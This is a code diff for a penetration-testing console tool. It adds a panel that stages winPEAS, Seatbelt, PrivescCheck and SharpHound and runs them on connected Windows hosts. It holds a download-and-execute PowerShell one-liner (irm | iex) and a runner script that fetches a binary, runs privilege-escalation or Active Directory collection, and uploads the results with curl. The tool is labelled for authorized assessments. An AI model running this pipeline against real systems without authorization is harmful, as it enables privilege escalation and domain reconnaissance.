@@ -535,6 +535,7 @@ body.terminal-view { height: 100dvh; overflow: hidden; }
 .terminal-view #console-proxy { display: none; }
 .terminal-view #console-callbacks { display: none; }
 .terminal-view #windows-recon { display: none; }
+.terminal-view #windows-tools { display: none; }
 #console-callbacks { margin: 16px 0 24px; }
 #console-callbacks .section-head { margin-bottom: 8px; }
 #console-callbacks .rs-cfg { margin-bottom: 8px; }
@@ -543,6 +544,14 @@ body.terminal-view { height: 100dvh; overflow: hidden; }
 .recon-actions { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 12px; }
 .recon-actions input { flex: 1; min-width: 180px; }
 .recon-cat { margin: 18px 0 6px; color: var(--fnt); font-size: 11px; font-weight: 600; letter-spacing: .06em; text-transform: uppercase; }
+.recon-warning { color: var(--amb); font-size: 12px; margin: 8px 0 16px; padding: 10px 12px; border: 1px solid color-mix(in srgb, var(--amb) 45%, var(--brd)); border-radius: var(--radius); background: color-mix(in srgb, var(--amb) 8%, transparent); }
+.tool-card { padding: 14px 0; border-bottom: 1px solid var(--brd); }
+.tool-head { display: flex; align-items: baseline; justify-content: space-between; gap: 12px; }
+.tool-head strong { font-size: 13px; }
+.tool-head .meta { color: var(--fnt); font: 11px var(--mono); }
+.tool-card p { margin: 6px 0 10px; }
+.tool-actions { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+.tool-actions input[type=file] { max-width: 100%; color: var(--fnt); font-size: 12px; }
 .recon-row { display: grid; grid-template-columns: minmax(140px, 220px) minmax(0, 1fr) auto; gap: 12px; align-items: center; padding: 8px 0; border-bottom: 1px solid var(--brd); }
 .recon-row code { font-size: 12px; overflow-wrap: anywhere; }
 .recon-btns { display: flex; gap: 4px; }
@@ -917,7 +926,7 @@ body.terminal-view { height: 100dvh; overflow: hidden; }
           <p class="hint">Uses this page’s address. The other machine must be able to reach it. Runs as your current user; no service is installed.</p>
         </section>
         <div class="terminal-tab-bar"><a class="btn ghost sm" href="/#shells">Back to consoles</a><strong id="terminal-tab-title">Terminal</strong><span class="hint" id="terminal-tab-status">Connecting…</span></div>
-        <section class="console-workspace"><div class="section-head"><h2>Connected machines</h2><div class="console-actions"><button class="btn ghost sm" id="console-popout" disabled>Open terminal in new tab</button><button class="btn ghost sm" id="console-disconnect" disabled>Disconnect selected</button><button class="btn ghost sm" id="console-remove" title="Disconnect this machine and delete its session and terminal history" disabled>Remove selected</button></div></div><div class="console-tabs" id="console-sessions" aria-label="Connected machines"></div><div id="console-proxy" hidden><div class="connect-command"><span class="hint">Network proxy</span><code id="console-proxy-address"></code><span class="hint" id="console-proxy-target"></span><button class="btn ghost sm" id="console-proxy-use" disabled>Use selected machine</button></div><p class="hint">Run proxychains4 or any SOCKS5 client on this host. Traffic exits from the selected machine’s network.</p></div><div id="console-callbacks" hidden><div class="section-head"><h2>Inbound callbacks</h2></div><p class="hint">Listen on the connected machine and forward connections to a service on this host.</p><div class="rs-cfg"><label>Local port <input class="rs-in" id="callback-local" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444"></label><label>Endpoint port <input class="rs-in" id="callback-remote" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444"></label><button class="btn ghost sm" id="callback-add">Add callback</button></div><div id="callback-list"></div></div><details class="recon-panel" id="windows-recon"><summary>Windows enumeration</summary><p class="hint">Read-only low-privilege checks and an escalation-path report. Runs in the selected Windows console. Open this page through the public HTTPS URL before running winenum. Authorized assessments only.</p><div class="recon-actions"><button class="btn ghost sm" id="recon-winenum">Run winenum</button><input class="rs-in" id="recon-search" type="search" placeholder="Filter commands…" autocomplete="off" spellcheck="false"></div><div id="recon-list"></div></details><p class="empty-line" id="console-empty">Waiting for a connection. Run the command above on your test machine.</p><div class="browser-terminal" id="browser-terminal" hidden></div><p class="hint" id="console-terminal-info">Ctrl+C interrupts the remote command. Type exit to end the shell.</p></section>
+        <section class="console-workspace"><div class="section-head"><h2>Connected machines</h2><div class="console-actions"><button class="btn ghost sm" id="console-popout" disabled>Open terminal in new tab</button><button class="btn ghost sm" id="console-disconnect" disabled>Disconnect selected</button><button class="btn ghost sm" id="console-remove" title="Disconnect this machine and delete its session and terminal history" disabled>Remove selected</button></div></div><div class="console-tabs" id="console-sessions" aria-label="Connected machines"></div><div id="console-proxy" hidden><div class="connect-command"><span class="hint">Network proxy</span><code id="console-proxy-address"></code><span class="hint" id="console-proxy-target"></span><button class="btn ghost sm" id="console-proxy-use" disabled>Use selected machine</button></div><p class="hint">Run proxychains4 or any SOCKS5 client on this host. Traffic exits from the selected machine’s network.</p></div><div id="console-callbacks" hidden><div class="section-head"><h2>Inbound callbacks</h2></div><p class="hint">Listen on the connected machine and forward connections to a service on this host.</p><div class="rs-cfg"><label>Local port <input class="rs-in" id="callback-local" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444"></label><label>Endpoint port <input class="rs-in" id="callback-remote" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444"></label><button class="btn ghost sm" id="callback-add">Add callback</button></div><div id="callback-list"></div></div><details class="recon-panel" id="windows-recon"><summary>Windows enumeration</summary><p class="hint">Read-only low-privilege checks and an escalation-path report. Runs in the selected Windows console. Open this page through the public HTTPS URL before running winenum. Authorized assessments only.</p><div class="recon-actions"><button class="btn ghost sm" id="recon-winenum">Run winenum</button><input class="rs-in" id="recon-search" type="search" placeholder="Filter commands…" autocomplete="off" spellcheck="false"></div><div id="recon-list"></div></details><details class="recon-panel" id="windows-tools"><summary>Windows tools</summary><p class="hint">Upload official tool files here. expose serves them to the endpoint through a short-lived ticket and uploads the report or SharpHound ZIP to Received files.</p><p class="recon-warning">Third-party tools: winPEAS, Seatbelt, PrivescCheck, and SharpHound can trigger AV/EDR detections, quarantine, or alerts. Use only on authorized systems.</p><div id="windows-tool-list"></div></details><p class="empty-line" id="console-empty">Waiting for a connection. Run the command above on your test machine.</p><div class="browser-terminal" id="browser-terminal" hidden></div><p class="hint" id="console-terminal-info">Ctrl+C interrupts the remote command. Type exit to end the shell.</p></section>
       </div>
       <p id="console-error" class="console-error" role="status"></p>
       <details class="legacy-shells"><summary>Raw TCP connection commands</summary><p class="hint">For direct network tests. These require a separate TCP listener and reachable port.</p>
@@ -1745,7 +1754,13 @@ loadDisk();
 </script><script>/* Browser terminal control with single-use connector enrollment. */
 (function(){
   let enabled=false,ticket='',expires=0,platform='win',selected='',terminal=null,fit=null,cursor=0,generation=0,polling=false;
-  let inputQueue=Promise.resolve(),sessions=[],available=[],proxy=null,callbacks=[];
+  let inputQueue=Promise.resolve(),sessions=[],available=[],proxy=null,callbacks=[],tools=[];
+  const windowsTools=[
+    {id:'winpeas',name:'winPEAS',file:/^winpeas.*\.(exe|bat)$/i,kind:'winpeas',expected:'winPEAS*.exe/.bat',desc:'Broad local enumeration. Very noisy and frequently flagged by Defender/EDR.'},
+    {id:'seatbelt',name:'Seatbelt',file:/^seatbelt\.exe$/i,kind:'seatbelt',expected:'Seatbelt.exe',desc:'Host, user, and security posture checks. .NET; generally quieter than winPEAS.'},
+    {id:'privesccheck',name:'PrivescCheck',file:/^privesccheck\.ps1$/i,kind:'privesccheck',expected:'PrivescCheck.ps1',desc:'Detailed low-privilege privilege-escalation checks. Best local signal of the four.'},
+    {id:'sharphound',name:'SharpHound',file:/^sharphound\.exe$/i,kind:'sharphound',expected:'SharpHound.exe',desc:'AD collection for BloodHound. Domain user; produces a ZIP for import.'}
+  ];
   const reconCommands=[
     ['Identity','Whoami full',String.raw`whoami /all`],
     ['Identity','Token privileges',String.raw`whoami /priv`],
@@ -1882,6 +1897,49 @@ loadDisk();
       actions.append(run,copy);row.append(label,code,actions);list.appendChild(row);
     });
   }
+  function stagedTool(def){return tools.find(tool=>def.file.test(tool.name))}
+  function renderTools(){
+    const list=q('windows-tool-list');if(!list)return;
+    list.replaceChildren();
+    windowsTools.forEach(def=>{
+      const staged=stagedTool(def);
+      const card=document.createElement('div');card.className='tool-card';
+      const head=document.createElement('div');head.className='tool-head';
+      const title=document.createElement('strong');title.textContent=def.name;
+      const status=document.createElement('span');status.className='meta';status.textContent=staged?staged.name+' · '+fmt(staged.size):'not staged · '+def.expected;
+      head.append(title,status);
+      const desc=document.createElement('p');desc.className='hint';desc.textContent=def.desc;
+      const actions=document.createElement('div');actions.className='tool-actions';
+      const input=document.createElement('input');input.type='file';input.accept=def.id==='privesccheck'?'.ps1':'.exe,.bat,.cmd';
+      const upload=document.createElement('button');upload.className='btn ghost sm';upload.textContent='Upload';
+      upload.addEventListener('click',async()=>{
+        if(!input.files.length){notice('Choose a file first');return}
+        try{await uploadTool(input.files[0]);notice('Uploaded '+input.files[0].name)}
+        catch(e){notice(e.message)}
+      });
+      const run=document.createElement('button');run.className='btn ghost sm';run.textContent='Run';run.disabled=!staged;
+      run.addEventListener('click',()=>runTool(def,staged).catch(e=>notice(e.message)));
+      actions.append(input,upload,run);card.append(head,desc,actions);list.appendChild(card);
+    });
+  }
+  async function refreshTools(){tools=(await api('tools')).tools||[];renderTools()}
+  async function uploadTool(file){
+    const response=await fetch('/console/tools/'+encodeURIComponent(file.name),{method:'POST',body:file,headers:{'Content-Type':'application/octet-stream'}});
+    const value=await response.json().catch(()=>({error:'Upload failed'}));
+    if(!response.ok)throw Error(value.error||'Upload failed');
+    await refreshTools();
+  }
+  async function runTool(def,staged){
+    if(!selected){notice('Select a console first');return}
+    const session=sessions.find(s=>s.id===selected);
+    if(!session||session.os!=='windows'){notice('Select a Windows console first');return}
+    if(!staged){notice('Upload '+def.name+' first');return}
+    const info=await api('winenum/ticket','POST',{});
+    const origin=location.origin;
+    const command=`$ExposeTicket='${info.ticket}'; $ExposeOrigin='${origin}'; $ExposeTool='${staged.name}'; $ExposeKind='${def.kind}'; irm "$ExposeOrigin/console/toolrunner.ps1?ticket=$ExposeTicket" | iex`;
+    await api('sessions/'+selected+'/input','POST',{data:command+'\r'});
+    notice(def.name+' started; report will appear in Received files');
+  }
   async function refresh(){
     if(!enabled||polling)return;polling=true;
     try{
@@ -1954,6 +2012,7 @@ loadDisk();
     q('console-controls').hidden=!enabled;
     if(!enabled){q('console-help').textContent='Start expose-online to use browser terminals.';return}
     await refresh();
+    await refreshTools();
     if(terminalSession)return;
     if(available.length)await invite();
     else notice('Build connectors on the host with: make -C expose install-console-clients');
@@ -2396,6 +2455,7 @@ body.terminal-view { height: 100dvh; overflow: hidden; }
 .terminal-view #console-proxy { display: none; }
 .terminal-view #console-callbacks { display: none; }
 .terminal-view #windows-recon { display: none; }
+.terminal-view #windows-tools { display: none; }
 #console-callbacks { margin: 16px 0 24px; }
 #console-callbacks .section-head { margin-bottom: 8px; }
 #console-callbacks .rs-cfg { margin-bottom: 8px; }
@@ -2404,6 +2464,14 @@ body.terminal-view { height: 100dvh; overflow: hidden; }
 .recon-actions { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 12px; }
 .recon-actions input { flex: 1; min-width: 180px; }
 .recon-cat { margin: 18px 0 6px; color: var(--fnt); font-size: 11px; font-weight: 600; letter-spacing: .06em; text-transform: uppercase; }
+.recon-warning { color: var(--amb); font-size: 12px; margin: 8px 0 16px; padding: 10px 12px; border: 1px solid color-mix(in srgb, var(--amb) 45%, var(--brd)); border-radius: var(--radius); background: color-mix(in srgb, var(--amb) 8%, transparent); }
+.tool-card { padding: 14px 0; border-bottom: 1px solid var(--brd); }
+.tool-head { display: flex; align-items: baseline; justify-content: space-between; gap: 12px; }
+.tool-head strong { font-size: 13px; }
+.tool-head .meta { color: var(--fnt); font: 11px var(--mono); }
+.tool-card p { margin: 6px 0 10px; }
+.tool-actions { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+.tool-actions input[type=file] { max-width: 100%; color: var(--fnt); font-size: 12px; }
 .recon-row { display: grid; grid-template-columns: minmax(140px, 220px) minmax(0, 1fr) auto; gap: 12px; align-items: center; padding: 8px 0; border-bottom: 1px solid var(--brd); }
 .recon-row code { font-size: 12px; overflow-wrap: anywhere; }
 .recon-btns { display: flex; gap: 4px; }
@@ -2544,6 +2612,8 @@ class ConsoleService:
         self.event_seen = {}
         self.script_tickets = {}
         self.winenum_script = ''
+        self.toolrunner_script = ''
+        self.tools_dir = ''
         self.condition = threading.Condition()
         self.platforms = ['linux-amd64', 'linux-arm64', 'darwin-amd64', 'darwin-arm64',
                           'windows-amd64.exe', 'windows-arm64.exe']
@@ -2777,7 +2847,7 @@ class ConsoleService:
             if len(self.script_tickets) >= 16:
                 self.script_tickets.pop(next(iter(self.script_tickets)), None)
             ticket = secrets.token_urlsafe(24)
-            self.script_tickets[ticket] = now + 1800
+            self.script_tickets[ticket] = now + 3600
             return ticket
 
     def valid_transfer_ticket(self, ticket):
@@ -2929,7 +2999,7 @@ class ConsoleService:
                 self.prune()
             if path == '/console/winenum/ticket' and handler.command == 'POST':
                 self.reply(handler, 200, {'ticket': self.new_script_ticket(),
-                                          'expires': time.time() + 1800})
+                                          'expires': time.time() + 3600})
                 return True
             if path == '/console/winenum.ps1' and handler.command == 'GET':
                 ticket = urllib.parse.parse_qs(parsed.query).get('ticket', [''])[0]
@@ -2937,6 +3007,41 @@ class ConsoleService:
                     self.reply(handler, 401, {'error': 'Script link expired'})
                     return True
                 body = self.winenum_script or '# winenum script unavailable'
+                handler._send(200, body, 'text/plain; charset=utf-8', (
+                    ('Cache-Control', 'no-store'), ('Referrer-Policy', 'no-referrer'),
+                    ('X-Content-Type-Options', 'nosniff')))
+                return True
+            if path == '/console/tools' and handler.command == 'GET':
+                files = []
+                if self.tools_dir and os.path.isdir(self.tools_dir):
+                    for name in sorted(os.listdir(self.tools_dir)):
+                        target = os.path.join(self.tools_dir, name)
+                        if os.path.isfile(target):
+                            info = os.stat(target)
+                            files.append({'name': name, 'size': info.st_size,
+                                          'mtime': int(info.st_mtime)})
+                self.reply(handler, 200, {'tools': files})
+                return True
+            if path.startswith('/console/tool/') and handler.command == 'GET':
+                ticket = urllib.parse.parse_qs(parsed.query).get('ticket', [''])[0]
+                if not self.valid_transfer_ticket(ticket):
+                    self.reply(handler, 401, {'error': 'Tool link expired'})
+                    return True
+                name = os.path.basename(urllib.parse.unquote(path[len('/console/tool/'):]))
+                target = os.path.join(self.tools_dir, name)
+                if not self.tools_dir or not os.path.isfile(target):
+                    self.reply(handler, 404, {'error': 'Tool not staged'})
+                    return True
+                with open(target, 'rb') as tool_file:
+                    handler._send(200, tool_file.read(), 'application/octet-stream', (
+                        ('Cache-Control', 'no-store'), ('X-Content-Type-Options', 'nosniff')))
+                return True
+            if path == '/console/toolrunner.ps1' and handler.command == 'GET':
+                ticket = urllib.parse.parse_qs(parsed.query).get('ticket', [''])[0]
+                if not self.valid_transfer_ticket(ticket):
+                    self.reply(handler, 401, {'error': 'Tool link expired'})
+                    return True
+                body = self.toolrunner_script or '# tool runner unavailable'
                 handler._send(200, body, 'text/plain; charset=utf-8', (
                     ('Cache-Control', 'no-store'), ('Referrer-Policy', 'no-referrer'),
                     ('X-Content-Type-Options', 'nosniff')))
@@ -3679,6 +3784,73 @@ if ($ExposeOrigin -and $ExposeTicket) {
 }
 WINENUMPS1
 
+_TOOLRUNNER_PS1=$(_mktmp /tmp/expose-toolrunner.XXXXXX)
+cat > "$_TOOLRUNNER_PS1" <<'TOOLRUNNERPS1'
+# expose tool runner — downloads a staged Windows tool and uploads its report.
+# Third-party tools can trigger Defender/EDR. Authorized assessments only.
+$ErrorActionPreference = 'SilentlyContinue'
+Write-Warning 'Third-party Windows tool: Defender/EDR may block, quarantine, or alert. Authorized use only.'
+
+if (-not $ExposeTool -or -not $ExposeKind -or -not $ExposeTicket -or -not $ExposeOrigin) {
+    Write-Host '[!] Missing tool context. Start the tool from the expose Windows tools panel.'
+    return
+}
+
+$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+$url = "$ExposeOrigin/console/tool/$ExposeTool?ticket=$ExposeTicket"
+$local = Join-Path $env:TEMP $ExposeTool
+try {
+    Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $local -ErrorAction Stop
+} catch {
+    Write-Host "[!] Could not download $ExposeTool from expose: $($_.Exception.Message)"
+    return
+}
+
+$report = Join-Path $env:TEMP ("expose-{0}-{1}-{2}.txt" -f $ExposeKind, $env:COMPUTERNAME, $stamp)
+$zip = $null
+try { Start-Transcript -Path $report -Force | Out-Null } catch {}
+
+switch ($ExposeKind) {
+    'winpeas' {
+        & $local cmd
+    }
+    'seatbelt' {
+        & $local -group=all
+    }
+    'privesccheck' {
+        . $local
+        Invoke-PrivescCheck -Extended
+    }
+    'sharphound' {
+        $out = Join-Path $env:TEMP ("expose-sharphound-{0}-{1}" -f $env:COMPUTERNAME, $stamp)
+        New-Item -ItemType Directory -Force -Path $out | Out-Null
+        & $local -c All --OutputDirectory $out --ZipFileName sharphound.zip
+        $zip = Get-ChildItem -LiteralPath $out -Filter '*.zip' | Select-Object -First 1
+    }
+    default {
+        & $local
+    }
+}
+
+try { Stop-Transcript | Out-Null } catch {}
+$upload = $report
+if ($ExposeKind -eq 'sharphound' -and $zip) { $upload = $zip.FullName }
+
+if (Test-Path -LiteralPath $upload) {
+    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
+    if ($curl) {
+        & $curl.Source -s -F "files=@$upload" "$ExposeOrigin/upload?ticket=$ExposeTicket" | Out-Null
+        if ($LASTEXITCODE -eq 0) { Write-Host "[+] Report uploaded to $ExposeOrigin" }
+        else { Write-Host "[!] Upload failed; retrieve $upload manually." }
+    } else {
+        Write-Host "[!] curl.exe not found; retrieve $upload manually."
+    }
+    Write-Host "[+] Report: $upload"
+} else {
+    Write-Host '[!] No report file was produced. The tool may have been blocked or failed.'
+}
+TOOLRUNNERPS1
+
 _export_common() {
   export EXPOSE_PORT="$PORT" EXPOSE_BIND="$BIND" EXPOSE_VERBOSE="$VERBOSE"
   export EXPOSE_UPLOAD_HTML="$_UPLOAD_HTML" EXPOSE_UPLOAD_DIR="$UPLOAD_DIR"
@@ -3696,6 +3868,7 @@ _export_common() {
   export EXPOSE_LOGO_SVG="$_LOGO_SVG"
   export EXPOSE_CONSOLES="$CONSOLES" EXPOSE_CONSOLE_MODULE="$_CONSOLE_PY"
   export EXPOSE_WINENUM="$_WINENUM_PS1"
+  export EXPOSE_TOOLRUNNER="$_TOOLRUNNER_PS1"
   export EXPOSE_PROXY="$PROXY"
   _CALLBACKS_LIST=""
   (( ${#CALLBACKS[@]} )) && _CALLBACKS_LIST=$(IFS=,; printf '%s' "${CALLBACKS[*]}")
@@ -3873,6 +4046,15 @@ try:
         consoles.winenum_script = winenum_file.read()
 except OSError:
     consoles.winenum_script = ''
+try:
+    with open(os.environ.get('EXPOSE_TOOLRUNNER', '')) as toolrunner_file:
+        consoles.toolrunner_script = toolrunner_file.read()
+except OSError:
+    consoles.toolrunner_script = ''
+tools_dir = os.environ.get('EXPOSE_TOOLS_DIR',
+                           os.path.join(os.path.expanduser('~'), '.local/share/expose/tools'))
+os.makedirs(tools_dir, exist_ok=True)
+consoles.tools_dir = tools_dir
 proxy_bind = os.environ.get('EXPOSE_PROXY', '').strip()
 if proxy_bind and console_enabled:
     try:
@@ -4054,6 +4236,44 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             length = 0
         return self.rfile.read(length) if length > 0 else b""
 
+    def _receive_tool(self, path):
+        name = os.path.basename(urllib.parse.unquote(path[len('/console/tools/'):]))
+        if (not re.fullmatch(r'[A-Za-z0-9._-]{1,120}', name)
+                or not name.lower().endswith(('.exe', '.ps1', '.bat', '.cmd', '.zip'))):
+            self.close_connection = True
+            self._send(400, json.dumps({'error': 'Unsupported tool filename'}), 'application/json')
+            return
+        try:
+            length = int(self.headers.get('Content-Length', '0'))
+        except ValueError:
+            length = -1
+        if not 0 < length <= 200 * 1024 * 1024:
+            self.close_connection = True
+            self._send(413, json.dumps({'error': 'Tool uploads are limited to 200 MB'}),
+                       'application/json')
+            return
+        temp = os.path.join(tools_dir, name + '.part')
+        remaining = length
+        try:
+            with open(temp, 'wb') as target:
+                while remaining > 0:
+                    chunk = self.rfile.read(min(65536, remaining))
+                    if not chunk:
+                        raise OSError('Upload truncated')
+                    target.write(chunk)
+                    remaining -= len(chunk)
+            os.replace(temp, os.path.join(tools_dir, name))
+        except OSError as error:
+            self.close_connection = True
+            try:
+                os.remove(temp)
+            except OSError:
+                pass
+            self._send(500, json.dumps({'error': str(error)}), 'application/json')
+            return
+        self._send(200, json.dumps({'ok': True, 'name': name, 'size': length}),
+                   'application/json')
+
     def _cookie_token(self):
         for part in self.headers.get('Cookie', '').split(';'):
             name, separator, value = part.strip().partition('=')
@@ -4107,10 +4327,13 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 or path == '/console/register'
                 or path.startswith('/console/agent/')
                 or path == '/console/winenum.ps1'
+                or path == '/console/toolrunner.ps1'
+                or path.startswith('/console/tool/')
                 or self.command == 'OPTIONS'):
             return True
         if self._session_valid():
             return True
+        self.close_connection = True
         if self.command == 'GET' and 'text/html' in self.headers.get('Accept', ''):
             self._send(401, login_page('', path), 'text/html; charset=utf-8', LOGIN_HEADERS)
         else:
@@ -4400,6 +4623,11 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             return
         if path == '/logout':
             self._handle_logout()
+            return
+        if path.startswith('/console/tools/') and path != '/console/tools':
+            if not self._authorized():
+                return
+            self._receive_tool(path)
             return
         ticket_upload = False
         if path == '/upload':
